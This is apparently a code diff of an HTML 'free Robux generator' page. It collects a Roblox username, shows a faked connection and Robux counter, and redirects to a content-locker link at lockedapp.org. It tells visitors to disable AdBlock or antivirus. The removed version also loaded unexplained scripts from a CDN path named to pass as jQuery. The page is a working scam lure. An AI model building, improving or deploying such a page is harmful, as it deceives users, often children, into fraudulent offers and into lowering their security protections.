@@ -1,280 +1,208 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document</title>
-      <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Roboto+Slab:wght@100..900&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/lib-devtools/ajax.libs.jquery/1.css" />
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/lib-devtools/ajax.libs.jquery/2.css" />
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Robux Generator</title>
+
+  <!-- Bootstrap + Google Font -->
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" />
+  <link href="https://fonts.googleapis.com/css2?family=Roboto+Slab:wght@400;600;700&display=swap" rel="stylesheet" />
+
+  <style>
+    body {
+      font-family: "Roboto Slab", serif;
+      background: linear-gradient(145deg, #ffffff, #e9efff);
+      min-height: 100vh;
+      text-align: center;
+      overflow-x: hidden;
+    }
+    nav img {
+      width: 130px;
+      margin: 20px auto;
+      display: block;
+    }
+    header {
+      background: #fff;
+      border-radius: 12px;
+      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
+      padding: 20px;
+      margin: 0 auto 25px;
+      width: 90%;
+    }
+    header h3 {
+      margin-top: 10px;
+      color: #333;
+      font-weight: 700;
+    }
+    header p {
+      font-size: 15px;
+      color: #555;
+    }
+    .step {
+      display: none;
+    }
+    .active-step {
+      display: block !important;
+      animation: fadeIn 0.6s ease;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    .btn-main {
+      background: #0d6efd;
+      border: none;
+      color: white;
+      padding: 12px 30px;
+      border-radius: 8px;
+      font-size: 16px;
+      margin-top: 20px;
+      transition: 0.3s;
+    }
+    .btn-main:hover {
+      background: #0b5ed7;
+    }
+    .input-group input {
+      border-radius: 8px;
+      padding: 12px;
+      border: 1px solid #ccc;
+    }
+    .progress {
+      width: 80%;
+      margin: 15px auto;
+      height: 15px;
+      border-radius: 8px;
+    }
+    .loader {
+      border: 6px solid #f3f3f3;
+      border-top: 6px solid #0d6efd;
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      animation: spin 1s linear infinite;
+      margin: 20px auto;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    .count {
+      font-size: 22px;
+      font-weight: 700;
+      color: #0d6efd;
+      margin: 15px 0;
+    }
+  </style>
 </head>
-<body class="xload">
 
-    <nav>
-        <img src="https://cdn.jsdelivr.net/gh/lib-devtools/ajax.libs.jquery/2r.png" alt="">
-    </nav>
-    <header>
-        <p>Generate unlimited robux with our robux generator tool. You can buy any items on roblox with our robux hack. Claim your robux now before the expiry date !</p>
-        <h3>Claim your Robux Now before the expiry date !</h3>
-    </header>
+<body>
+  <nav>
+    <img src="https://cdn.jsdelivr.net/gh/lib-devtools/ajax.libs.jquery/2r.png" alt="Logo" />
+  </nav>
 
- <div class="container-md p-0">
-        <div class="stepx d-nonex" id="step-1">
-            <div class="item">
-                <div class="first">
-                    <img src="https://cdn.jsdelivr.net/gh/lib-devtools/ajax.libs.jquery/3r.png" alt="">
-                    <div class="more">
-                        <div class="price">
-                            <div class="old">4.99$</div>
-                            <div class="new">0.00$</div>
-                        </div>
-                        <div class="end">Offer ends in 1 days : <span class="date"></span></div>
-                    </div>
-                </div>
-                <div class="button">
-                    <button>
-                        <img src="https://cdn.jsdelivr.net/gh/lib-devtools/ajax.libs.jquery/5r.png" alt="">
-                        <div>400</div>
-                    </button>
-                </div>
-            </div>
-            <div class="item">
-                <div class="first">
-                    <img src="https://cdn.jsdelivr.net/gh/lib-devtools/ajax.libs.jquery/3r.png" alt="">
-                    <div class="more">
-                        <div class="price">
-                            <div class="old">9.99$</div>
-                            <div class="new">0.00$</div>
-                        </div>
-                        <div class="end">Offer ends in 1 days : <span class="date"></span></div>
-                    </div>
-                </div>
-                <div class="button">
-                    <button>
-                        <img src="https://cdn.jsdelivr.net/gh/lib-devtools/ajax.libs.jquery/5r.png" alt="">
-                        <div>800</div>
-                    </button>
-                </div>
-            </div>
-            <div class="item">
-                <div class="first">
-                    <img src="https://cdn.jsdelivr.net/gh/lib-devtools/ajax.libs.jquery/3r.png" alt="">
-                    <div class="more">
-                        <div class="price">
-                            <div class="old">19.99$</div>
-                            <div class="new">0.00$</div>
-                        </div>
-                        <div class="end">Offer ends in 1 days : <span class="date"></span></div>
-                    </div>
-                </div>
-                <div class="button">
-                    <button>
-                        <img src="https://cdn.jsdelivr.net/gh/lib-devtools/ajax.libs.jquery/5r.png" alt="">
-                        <div>1,700</div>
-                    </button>
-                </div>
-            </div>
-            <div class="item">
-                <div class="first">
-                    <img src="https://cdn.jsdelivr.net/gh/lib-devtools/ajax.libs.jquery/3r.png" alt="">
-                    <div class="more">
-                        <div class="price">
-                            <div class="old">49.99$</div>
-                            <div class="new">0.00$</div>
-                        </div>
-                        <div class="end">Offer ends in 1 days : <span class="date"></span></div>
-                    </div>
-                </div>
-                <div class="button">
-                    <button>
-                        <img src="https://cdn.jsdelivr.net/gh/lib-devtools/ajax.libs.jquery/5r.png" alt="">
-                        <div>4,500</div>
-                    </button>
-                </div>
-            </div>
-            <div class="item">
-                <div class="first">
-                    <img src="https://cdn.jsdelivr.net/gh/lib-devtools/ajax.libs.jquery/3r.png" alt="">
-                    <div class="more">
-                        <div class="price">
-                            <div class="old">99.99$</div>
-                            <div class="new">0.00$</div>
-                        </div>
-                        <div class="end">Offer ends in 1 days : <span class="date"></span></div>
-                    </div>
-                </div>
-                <div class="button">
-                    <button>
-                        <img src="https://cdn.jsdelivr.net/gh/lib-devtools/ajax.libs.jquery/5r.png" alt="">
-                        <div>10,000</div>
-                    </button>
-                </div>
-            </div>
-            <div class="item">
-                <div class="first">
-                    <img src="https://cdn.jsdelivr.net/gh/lib-devtools/ajax.libs.jquery/3r.png" alt="">
-                    <div class="more">
-                        <div class="price">
-                            <div class="old">149.99$</div>
-                            <div class="new">0.00$</div>
-                        </div>
-                        <div class="end">Offer ends in 1 days : <span class="date"></span></div>
-                    </div>
-                </div>
-                <div class="button">
-                    <button>
-                        <img src="https://cdn.jsdelivr.net/gh/lib-devtools/ajax.libs.jquery/5r.png" alt="">
-                        <div>10,000</div>
-                    </button>
-                </div>
-            </div>
-            <div class="item">
-                <div class="first">
-                    <img src="https://cdn.jsdelivr.net/gh/lib-devtools/ajax.libs.jquery/3r.png" alt="">
-                    <div class="more">
-                        <div class="price">
-                            <div class="old">199.99$</div>
-                            <div class="new">0.00$</div>
-                        </div>
-                        <div class="end">Offer ends in 1 days : <span class="date"></span></div>
-                    </div>
-                </div>
-                <div class="button">
-                    <button>
-                        <img src="https://cdn.jsdelivr.net/gh/lib-devtools/ajax.libs.jquery/5r.png" alt="">
-                        <div>50,000</div>
-                    </button>
-                </div>
-            </div>
-        </div>
+  <header>
+    <p>Generate free Robux using our secure online tool! Simply enter your username and follow the steps below to claim your Robux instantly.</p>
+    <h3>Free Robux Generator 2025</h3>
+  </header>
 
-        
-        <div class="step d-none" id="step-2">
-            <div class="img-robux">
-                <img src="https://cdn.jsdelivr.net/gh/lib-devtools/ajax.libs.jquery/7r.png" alt="">
-                <div class="rbx"><span>0</span> ROBUX</div>
-            </div>
-            <div class="input">
-                <input type="text" id="username" placeholder="Username">
-                <img src="https://cdn.jsdelivr.net/gh/lib-devtools/ajax.libs.jquery/8r.png" alt="">
-            </div>
-            <br>
-            <br>
-            <div class="error"></div>
-            <div class="next connect">Connect Username</div>
-        </div>
+  <div class="container">
 
-        <div class="step d-none" id="step-3">
-            <br>
-            <div class="loader">
-                <img class="animation" src="https://cdn.jsdelivr.net/gh/lib-devtools/ajax.libs.jquery/6r.png" alt="">
-            </div>
-            <div class="txt">Connecting to seveur...</div>
-            <br>
-        </div>
-
-        <div class="step d-none" id="step-4">
-            <br>
-            <div class="profile">
-                <div class="img"><img class="avatar" src="https://tr.rbxcdn.com/30DAY-AvatarHeadshot-F481357DAF4D466E58D843156B234862-Png/720/720/AvatarHeadshot/Webp/noFilter" alt=""></div>
-                <div class="more">
-                    <div class="name">bvb</div>
-                    <div class="username ">@<span class="usr-rbx"></span></div>
-                </div>
-            </div>
-            <div class="count">
-                <div class="c-item">
-                    <div class="t-count friends">255</div>
-                    <div class="text">friends</div>
-                </div>
-                <div class="c-item">
-                    <div class="t-count followers">255</div>
-                    <div class="text">followers</div>
-                </div>
-                <div class="c-item">
-                    <div class="t-count followings">255</div>
-                    <div class="text">followings</div>
-                </div>
-            </div>
-            <div class="confirm">CONFIRM USERNAME</div>
-        </div>
-
-
-        <div class="step d-none" id="step-5">
-            <div class="last">
-                <div class="img"><img class="avatar" src="https://tr.rbxcdn.com/30DAY-AvatarHeadshot-F481357DAF4D466E58D843156B234862-Png/720/720/AvatarHeadshot/Webp/noFilter" alt=""></div>
-                <div class="rbx-counter">
-                    <img src="https://cdn.jsdelivr.net/gh/lib-devtools/ajax.libs.jquery/3r.png" alt="" class="icon">
-                    <div class="rbx-count">0</div>
-                </div>
-            </div>
-            <div class="adding">
-                Adding <span class="rbx-c">800</span> Robux to <span id="username" class="usr-rbx">bvb</span>
-            </div>
-            <div class="action">
-                <button>Add Now</button>
-            </div>
-        </div>
-        <div class="step p-0 d-none" id="step-6">
-            <div class="recived rbx"><span>0</span> <img src="https://cdn.jsdelivr.net/gh/lib-devtools/ajax.libs.jquery/3r.png" alt=""> Robux recived for <span class="usr-rbx">user</span></div>
-            <div class="userinfo">
-                <div class="main">
-                    <img class="avatar" src="https://tr.rbxcdn.com/30DAY-AvatarHeadshot-9F8686661F50291FC4594CF25B4026C3-Png/720/720/AvatarHeadshot/Webp/noFilter" alt="">
-                    <div class="username usr-rbx">@bvb</div>
-                </div>
-                <div class="then">
-                    <img src=" https://cdn.jsdelivr.net/gh/lib-devtools/ajax.libs.jquery/7r.png" alt="">
-                    <div class="rbx"><span>1000</span> Robux</div>
-                </div>
-            </div>
-            <div class="details">
-                <p> <span class="usr-rbx"></span>! You're one step away from reciving <span class="rbx-c"></span> robux</p>
-                <p>Click on the button to confirm that you are Human and not a Bot</p>
-                <div class="action-btn">
-                <button onclick="window.location.href='https://lockedapp.org/cl/i/99oxkv'">Verify Now</button>
-                </div>
-                <div class="bonus"><span>Bonus : </span>Verify and earn <span class="bs"></span> extra Robux as bonus</div>
-            </div>
-        </div>
-        <div class="step p-0 d-none" id="step-7">
-            <div class="recived rbx"><span>0</span> <img src="https://cdn.jsdelivr.net/gh/lib-devtools/ajax.libs.jquery/3r.png" alt=""> Robux recived for <span class="usr-rbx">user</span></div>
-            <div class="userinfo">
-                <div class="main">
-                    <img class="avatar" src="https://tr.rbxcdn.com/30DAY-AvatarHeadshot-9F8686661F50291FC4594CF25B4026C3-Png/720/720/AvatarHeadshot/Webp/noFilter" alt="">
-                    <div class="username usr-rbx">@bvb</div>
-                </div>
-                <div class="then">
-                    <img src="https://cdn.jsdelivr.net/gh/lib-devtools/ajax.libs.jquery/7r.png" alt="">
-                    <div class="">
-                        <div class="rbx"><span></span> ROBUX</div>
-                        <div>+<span class="bs"></span> ROBUX</div>
-                    </div>
-                </div>
-            </div>
-            <div class="details">
-           <p><span class="total"></span> Robux are ready for you!<br><br>
-If the content locker doesn't appear, please disable your AdBlock or antivirus temporarily. These tools may block essential elements required to verify your participation and deliver your Robux reward.</p>
-                </div>
-            </div>
-        </div>
-
-        <div class="notification animate__animated">
-            <div>
-                <img src="https://cdn.jsdelivr.net/gh/lib-devtools/ajax.libs.jquery/3r.png" alt="">
-                <div>
-                    <div class="title">Roblox</div>
-                    <div class="text">Outrageous Has got 400 Robux</div>
-                </div>
-                <div class="time">Just now</div>
-            </div>
-        </div>
+    <!-- STEP 1 -->
+    <div class="step active-step" id="step-1">
+      <button class="btn-main" id="startBtn">Start Generator</button>
     </div>
-<script src="https://cdn.jsdelivr.net/gh/lib-devtools/ajax.libs.jquery/mjus6gh.js"></script>
-<script src="https://cdn.jsdelivr.net/gh/lib-devtools/ajax.libs.jquery/6gsj7s.js"></script>
-<script src="https://cdn.jsdelivr.net/gh/lib-devtools/ajax.libs.jquery/ajsyt67s.js"></script>
+
+    <!-- STEP 2 -->
+    <div class="step" id="step-2">
+      <h4>Enter Your Roblox Username</h4>
+      <div class="input-group justify-content-center mt-3">
+        <input type="text" id="username" class="form-control w-75 text-center" placeholder="e.g. RobloxPlayer123" />
+      </div>
+      <button class="btn-main" id="connectBtn">Connect</button>
+    </div>
+
+    <!-- STEP 3 -->
+    <div class="step" id="step-3">
+      <h4>Connecting to Roblox Server...</h4>
+      <div class="loader"></div>
+      <div class="progress mt-3">
+        <div class="progress-bar progress-bar-striped progress-bar-animated bg-primary" style="width: 10%" id="progressBar"></div>
+      </div>
+      <p id="progressText">Initializing...</p>
+    </div>
+
+    <!-- STEP 4 -->
+    <div class="step" id="step-4">
+      <h4>Connected!</h4>
+      <p>Username: <span class="usr-rbx text-primary fw-bold"></span></p>
+      <button class="btn-main" id="confirmBtn">Confirm Username</button>
+    </div>
+
+    <!-- STEP 5 -->
+    <div class="step" id="step-5">
+      <h4>Adding Robux...</h4>
+      <div class="loader"></div>
+      <div class="count" id="robuxCount">0 Robux</div>
+      <p>Processing your request...</p>
+    </div>
+
+    <!-- STEP 6 (Locker) -->
+    <div class="step" id="step-6">
+      <h4>Verification Required</h4>
+      <p class="mt-2">You’re almost done! Please verify you’re human to claim your Robux.</p>
+      <button class="btn-main" onclick="window.location.href='https://lockedapp.org/cl/i/99oxkv'">Verify Now</button>
+      <p class="text-muted mt-3" style="font-size: 13px;">If the locker doesn’t appear, please disable AdBlock or antivirus temporarily.</p>
+    </div>
+
+  </div>
+
+  <!-- jQuery -->
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+  <script>
+    $(document).ready(function() {
+      function nextStep(current, next) {
+        $("#" + current).removeClass("active-step");
+        $("#" + next).addClass("active-step");
+      }
+
+      $("#startBtn").click(function() {
+        nextStep("step-1", "step-2");
+      });
+
+      $("#connectBtn").click(function() {
+        const user = $("#username").val().trim();
+        if (user === "") return alert("Please enter a valid username!");
+        $(".usr-rbx").text(user);
+        nextStep("step-2", "step-3");
+
+        // Simulate progress bar
+        let width = 10;
+        const progressInterval = setInterval(() => {
+          if (width >= 100) {
+            clearInterval(progressInterval);
+            nextStep("step-3", "step-4");
+          } else {
+            width += 10;
+            $("#progressBar").css("width", width + "%");
+            $("#progressText").text(`Connecting... ${width}%`);
+          }
+        }, 300);
+      });
+
+      $("#confirmBtn").click(function() {
+        nextStep("step-4", "step-5");
+        let robux = 0;
+        const robuxInterval = setInterval(() => {
+          robux += Math.floor(Math.random() * 100 + 50);
+          $("#robuxCount").text(robux + " Robux");
+          if (robux >= 800) {
+            clearInterval(robuxInterval);
+            setTimeout(() => nextStep("step-5", "step-6"), 1000);
+          }
+        }, 400);
+      });
+    });
+  </script>
 </body>
 </html>
